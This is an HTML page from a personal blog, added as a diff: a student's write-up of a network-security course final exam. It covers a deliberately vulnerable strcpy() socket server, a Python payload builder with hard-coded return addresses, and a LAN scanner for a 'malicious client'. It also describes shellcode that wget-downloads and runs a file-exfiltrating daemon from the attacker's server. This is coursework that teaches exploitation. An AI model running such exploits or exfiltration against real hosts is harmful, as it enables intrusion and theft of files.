@@ -1,0 +1,1492 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="实验," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="神奇小站" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="总体设计任务一：做一个服务端程序，其功能是：收到客户端请求之后，将请求中的字符串前后翻转，然后返回给客户端。（30 分） 任务二：基于上述服务程序，在保持基本功能的前提下，设计一个缓冲区溢出漏洞。并编写恶意客户端程序，扫描局域网内的所有机器，找到有该漏洞的服务端机器，在服务端机器上创建一个 txt 的文件，文件名是你的姓名.txt，文件内容是你的学号。（40 分） 任务三：利用上述漏洞，把一个自己">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全综合实验设计">
+<meta property="og:url" content="https://shenqiy.cn/2020-06-22-NS-The-Final-Exam/">
+<meta property="og:site_name" content="神奇小站">
+<meta property="og:description" content="总体设计任务一：做一个服务端程序，其功能是：收到客户端请求之后，将请求中的字符串前后翻转，然后返回给客户端。（30 分） 任务二：基于上述服务程序，在保持基本功能的前提下，设计一个缓冲区溢出漏洞。并编写恶意客户端程序，扫描局域网内的所有机器，找到有该漏洞的服务端机器，在服务端机器上创建一个 txt 的文件，文件名是你的姓名.txt，文件内容是你的学号。（40 分） 任务三：利用上述漏洞，把一个自己">
+<meta property="og:image" content="https://shenqiy.cn/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221417113-1593172509344.png">
+<meta property="og:image" content="https://shenqiy.cn/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221754210-1593172509345.png">
+<meta property="og:image" content="https://shenqiy.cn/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622164819499.png">
+<meta property="og:image" content="https://shenqiy.cn/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221839431-1593172509345.png">
+<meta property="og:image" content="https://shenqiy.cn/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621223352350.png">
+<meta property="og:image" content="https://shenqiy.cn/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023021090.png">
+<meta property="og:image" content="https://shenqiy.cn/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023250674.png">
+<meta property="og:image" content="https://shenqiy.cn/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622023111428.png">
+<meta property="article:published_time" content="2020-06-21T16:30:47.000Z">
+<meta property="article:modified_time" content="2020-07-13T16:46:35.849Z">
+<meta property="article:author" content="ColaLinN">
+<meta property="article:tag" content="实验">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shenqiy.cn/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221417113-1593172509344.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shenqiy.cn/2020-06-22-NS-The-Final-Exam/"/>
+
+
+
+
+
+  <title>网络安全综合实验设计 | 神奇小站</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">神奇小站</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">这里总有神奇的东西</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friendlink">
+          <a href="/friendlink/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+    
+  
+  
+
+  <article class="post post-type-normal true" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shenqiy.cn/2020-06-22-NS-The-Final-Exam/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ColaLinN">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="神奇小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">网络安全综合实验设计</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-06-22T00:30:47+08:00">
+                2020-06-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index">
+                    <span itemprop="name">实验</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+		  		  
+		  
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  10.1k字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  43分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="总体设计"><a href="#总体设计" class="headerlink" title="总体设计"></a>总体设计</h1><p><strong>任务一</strong>：做一个服务端程序，其功能是：收到客户端请求之后，将请求中的字符串前后翻转，然后返回给客户端。<strong>（30 分）</strong></p>
+<p><strong>任务二</strong>：基于上述服务程序，在保持基本功能的前提下，设计一个缓冲区溢出漏洞。并编写恶意客户端程序，扫描局域网内的所有机器，找到有该漏洞的服务端机器，在服务端机器上创建一个 txt 的文件，文件名是你的姓名.txt，文件内容是你的学号。<strong>（40 分）</strong></p>
+<p><strong>任务三</strong>：利用上述漏洞，把一个自己设计的程序 daemon 送上服务端机器并运行，这个 daemon能够搜索服务器上的所有 txt 文件，并找出文件名中含有你的姓名的文件，并利用网络传送给客户端机器（传出的方法不限，例如：email，在线 socket 连接等）。<strong>（20 分）</strong></p>
+<p><strong>任务四：</strong>在上述任务的基础上，设计一种密钥管理机制和传输加密方案，模拟将传输内容加密（包含文件名和文件内容）发送给客户端机器。用 wireshark 等工具抓取传输内容，证明未加密与加密的区别，并分析你所设计的密钥管理机制和传输加密方案的安全性。<strong>（10 分）</strong></p>
+<ul>
+<li><strong>对于任务一的字符串前后翻转服务端程序</strong>，我使用c语言编写，编写简单的sokcet通信服务，缓冲区溢出漏洞在其业务函数中使用了strcpy()导致栈溢出的问题。</li>
+<li><strong>对于任务二的恶意客户端程序</strong>，我采用python编写，其功能有<ul>
+<li>扫描遍历局域网中的ip地址，通过socket尝试连接端口，找出有运行服务端程序的机器</li>
+<li>与任务一的字符串前后翻转服务端程序交互，发出字符串，然后收到翻转后的字符串并打印</li>
+<li>exploit的功能，发送针对漏洞的payload（包含三种shellcode）</li>
+</ul>
+</li>
+<li><strong>对于任务三中的程序 daemon</strong>，我使用python编写，能够搜索服务器上的任意指定文件（可以指定为我们的文件名中含有你的姓名的文件），并利用网络传送给客户端。</li>
+<li><strong>对于任务四中的密钥管理机制和传输加密方案</strong><ul>
+<li>首先daemon.py作为服务器（受害方）被shellcode启动</li>
+<li>客户端（攻击方），启动client.py通过socket连接上该服务器，创建非对称加密RSA密钥，发送公钥和公钥Sha256摘要给服务器</li>
+<li>服务器（受害方）接收到RSA的公钥和公钥摘要之后，对公钥进行摘要判断，公钥是否被改动。如没有，就产生用于 AES 对称加密的密钥，将其用RSA公钥加密后，将其密文和密文摘要发给客户端（攻击方）</li>
+<li>客户端（攻击方）同上用对 AES密钥进行摘要，判断是否被改动。如没有，双方便可以用 AES密钥进行通信的加密了。</li>
+</ul>
+</li>
+<li><strong>用 wireshark 等工具抓取传输内容，证明未加密与加密的区别</strong><ul>
+<li>如果传输文件内容未加密，则wireshark 抓取到socket发送的包，可以直接在data部分看到传输的内容</li>
+<li>如果传输文件内容未加密，则抓取到的包，data部分是密文，无法被破译。</li>
+</ul>
+</li>
+<li><strong>包含了三种shellcode</strong>——创建学号.txt、下载 daemon程序、运行daemon程序<ul>
+<li>创建学号.txt，汇编使用了linux的系统调用（32位下实验：调用号5打开文件、调用号6关闭文件）</li>
+<li>下载 daemon程序，汇编使用了<strong>/usr/bin/wget</strong>程序来下载daemon（从攻击方开启的apache服务器中下载)</li>
+<li>运行daemon程序，汇编通过<strong>/usr/bin/python daemon.py</strong>来运行</li>
+</ul>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li><p>这次的期末考试，看似内容很短，其实囊括了很多内容，很多功能要实现。对linux系统的一些操作、socket的通信、栈溢出漏洞的设计与调试、扫描ip端口、linux的文件搜索、密钥管理方案的设计、抓包的分析以及shellcode的编写，多多少少都学习到了一些，掌握了一些。</p>
+</li>
+<li><p>暴露了我一些致命的问题，对linux操作系统的不熟悉、对c、c++的陌生、很多概念只是口头上说着好，实际代码能力却不足，还希望能够进步。</p>
+</li>
+<li><p>觉得最大的收获估计是对linux系统的一些操作以及shellcode的编写吧，对shellcode不再是纸上谈兵。虽然shellcode可以用工具生成，但自己编写shellcode使我对其不再云里雾里，成就感很足。勾起了我安全方向的兴趣，不知道以后有没有缘分搞安全了。</p>
+</li>
+<li><p>查阅了很多资料，这次考试基本上是对这门课所学的、所实验的东西进行了一个汇总。这一学期也不容易，因为学的东西多呀，所以实验和大作业都很多。虽然花了很多时间，但还是很有收获的。</p>
+</li>
+<li><p>本次写shellcode遇到了一些困难，列举如下:</p>
+<ul>
+<li>不清楚如何对不够4字节整数的字符串进行控制避免<code>00</code>字节——<ul>
+<li>可以通过call</li>
+<li>也可以通过linux中：<code>/</code>&lt;=&gt;<code>/////</code>   、 <code>x</code>&lt;=&gt;<code>./////x</code>等来实现4字节整数</li>
+</ul>
+</li>
+<li>编译的位数问题，由于32位和64位的系统调用有所不同，如果想用32位的系统调用号，就要<ul>
+<li><code>nasm -felf32 wget.nasm -o wget.o</code><br><code>ld -m elf_i386 wget.o -o wget</code></li>
+</ul>
+</li>
+<li>对寄存器进行操作时出现操作数和寄存器的大小不一，出现<code>00</code>字节<ul>
+<li>解决方法：<code>eax 32bit</code>  <code>ax 16bit</code>  <code>ah al 8bit</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="任务一-字符串前后翻转服务端程序"><a href="#任务一-字符串前后翻转服务端程序" class="headerlink" title="任务一 字符串前后翻转服务端程序"></a>任务一 字符串前后翻转服务端程序</h1><p><strong>任务一</strong>：做一个服务端程序，其功能是：收到客户端请求之后，将请求中的字符串前后翻转，然后返回给客户端。<strong>（30 分）</strong></p>
+<blockquote>
+<p>由于栈溢出的漏洞已经调过很多种类了：字符串复制栈溢出、整数栈溢出、格式化字符串栈溢出、堆溢出等等</p>
+<p>而这次的实验，我觉得重点不在于漏洞的复杂性，所以索性编写了strcpy()函数栈溢出漏洞。</p>
+</blockquote>
+<p>string前后翻转服务端程序，我使用c语言编写简单的sokcet服务，将客户端发来的字符串翻转之后回送。</p>
+<h2 id="1-1-漏洞原理"><a href="#1-1-漏洞原理" class="headerlink" title="1.1 漏洞原理"></a>1.1 漏洞原理</h2><p>缓冲区溢出漏洞在于处理字符串时<strong>main()-&gt;reverse()-&gt;foo()-&gt;strcpy()</strong>中，由于<code>strcpy()</code>在复制字符串时并未检查字符串的长度，使输入内容可以超过bufferA的空间，从而实现栈溢出，覆盖返回地址，跳到我们填入的shellcode。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞部分</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str);<span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了实现攻击，我们构造输入str，使其超出bufferA的部分恰好覆盖ebp的值和foo函数的栈返回ret，使该ret内容指向我们的shellcode，然后在foo返回之后即顺势跳到我们的shellcode，劫持成功。</p>
+<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221417113-1593172509344.png" alt="image-20200621221417113"></p>
+<p>如下为调试图</p>
+<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221754210-1593172509345.png" alt="image-20200621221754210"></p>
+<p>从图上可以看到，ebp位于<code>bufferA+108</code>（我把GS关了），而<code>bufferA只有100字节</code>，很奇怪</p>
+<p>回头看了之前project1栈溢出实验中6个vul中的foo函数，他们都是foo函数中创建了buffer，然后调用一个漏洞函数来执行的，大概的格式如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//5个栈溢出vul的基本格式</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">200</span>]; <span class="comment">//&lt;---在foo函数中只创建了一个局部变量，就call了下一个函数</span></span><br><span class="line">    nstrcpy(buf, <span class="keyword">sizeof</span> buf, arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//我写的漏洞函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str);<span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到：<code>在foo函数中只创建了一个局部变量，就call了下一个函数</code></p>
+<p>而我的函数也是这种格式，却产生了<code>bufferA只有100字节，ebp却位于bufferA+108</code>问题，这里表示疑惑，毕竟我所有的安全机制都关了。总而言之，不知道这8个字节意义是什么，但是却不影响我们溢出，所以暂且不管了。</p>
+<blockquote>
+<p>（RELRO：RELRO会有<strong>Partial RELRO</strong>和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表）</p>
+</blockquote>
+<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200622164819499.png" alt="image-20200622164819499"></p>
+<p>为了溢出，我们的shellcode可以如下拼接。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用于拼接字符串demon,具体的拼接函数可以选择三个shellcode进行拼接</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_new</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    payload = shellcode + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode)) <span class="comment">#shellcode以及nop</span></span><br><span class="line">    payload = payload + <span class="string">b'\xcc\xde\xff\xbf\xdc\xde\xff\xbf'</span> <span class="comment">#109字节处开始写ebp，ret</span></span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span>  <span class="comment">#payload结束</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>下图为<code>装载了创建文件的shellcode的payload</code>调试成功，成功创建<code>LinFengLv.txt</code></p>
+<p><img src="/2020/06/22/2020-06-22-NS-The-Final-Exam/image-20200621221839431-1593172509345.png" alt="image-20200621221839431"></p>
+<h2 id="1-2-收发数据"><a href="#1-2-收发数据" class="headerlink" title="1.2 收发数据"></a>1.2 收发数据</h2><p>逆转字符串程序主要在reverse()中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 8000</span></span><br><span class="line"><span class="comment">//漏洞部分</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> bufferA[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(bufferA,str);<span class="comment">//&lt;-----------漏洞所在</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//逆转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>* str)</span></span>&#123;</span><br><span class="line">	foo(str);</span><br><span class="line">	<span class="comment">//strncpy(buf,str,strlen(str));</span></span><br><span class="line">	<span class="comment">//assert(str);</span></span><br><span class="line">	<span class="keyword">int</span> ilen = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">char</span>* p = str + ilen - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">int</span> itemp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(str &lt; p)&#123;</span><br><span class="line">		itemp = *p;</span><br><span class="line">		*p = *str;</span><br><span class="line">		*str = itemp;</span><br><span class="line">		p--;</span><br><span class="line">		str++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//……</span></span><br><span class="line">	<span class="comment">//主要的收发业务部分</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">//阻塞接收客户端数据</span></span><br><span class="line">        len = <span class="built_in">read</span>(cfd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">		<span class="comment">// 将客户端发送的数据输出到屏幕中</span></span><br><span class="line">        <span class="built_in">write</span>(STDOUT_FILENO, buf, len);</span><br><span class="line">        <span class="comment">//处理业务</span></span><br><span class="line">		reverse(buf);</span><br><span class="line">        <span class="comment">//返回给客户端结果</span></span><br><span class="line">        <span class="built_in">write</span>(cfd, buf, len);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//……</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="任务二、恶意客户端程序"><a href="#任务二、恶意客户端程序" class="headerlink" title="任务二、恶意客户端程序"></a>任务二、恶意客户端程序</h1><p><strong>任务二</strong>：基于上述服务程序，在保持基本功能的前提下，设计一个缓冲区溢出漏洞。并编写恶意客户端程序，扫描局域网内的所有机器，找到有该漏洞的服务端机器，在服务端机器上创建一个 txt 的文件，文件名是你的姓名.txt，文件内容是你的学号。<strong>（40 分）</strong></p>
+<h2 id="2-1-扫描找到有该漏洞的服务端机器"><a href="#2-1-扫描找到有该漏洞的服务端机器" class="headerlink" title="2.1 扫描找到有该漏洞的服务端机器"></a>2.1 扫描找到有该漏洞的服务端机器</h2><p>主要是</p>
+<ul>
+<li>通过socket尝试连接<code>&#39;8.8.8.8&#39;</code>（任意），<code>socket.getsockname()[0]</code>获得本机的局域网ip</li>
+<li>通过本机ip计算出所有局域网的ip</li>
+<li>尝试socket连接局域网的ip的服务端端口（这里是8000），找出有运行服务端程序的机器</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建互斥锁</span></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">port_list = [<span class="string">"8000"</span>] <span class="comment">#默认扫描8000</span></span><br><span class="line">routers = [] <span class="comment">#扫描出的ip和端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得本机局域网ip</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_ip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        s.connect((<span class="string">'8.8.8.8'</span>, <span class="number">80</span>))</span><br><span class="line">        ip = s.getsockname()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">return</span> ip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义扫描函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_routers</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 获取本地ip地址</span></span><br><span class="line">    ip=get_host_ip()</span><br><span class="line">    <span class="comment"># 存放线程列表池</span></span><br><span class="line">    all_threads = []</span><br><span class="line">    <span class="comment"># 循环本地网卡IP列表</span></span><br><span class="line">    print(str())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="comment"># 把网卡IP"."进行分割,生成每一个可用地址的列表</span></span><br><span class="line">        array = ip.split(<span class="string">'.'</span>)</span><br><span class="line">        <span class="comment"># 获取分割后的第四位数字，生成该网段所有可用IP地址</span></span><br><span class="line">        array[<span class="number">3</span>] = str(i)</span><br><span class="line">        <span class="comment"># 把分割后的每一可用地址列表，用"."连接起来，生成新的ip</span></span><br><span class="line">        new_ip = <span class="string">'.'</span>.join(array)</span><br><span class="line">        <span class="comment">#print(new_ip)</span></span><br><span class="line">        <span class="comment"># 遍历需要扫描的端口号列表</span></span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> port_list:</span><br><span class="line">            dst_port = int(port)</span><br><span class="line">            <span class="comment"># 循环创建线程去链接该地址</span></span><br><span class="line">            t = threading.Thread(target=check_ip, args=(new_ip, dst_port))</span><br><span class="line">            t.start()</span><br><span class="line">   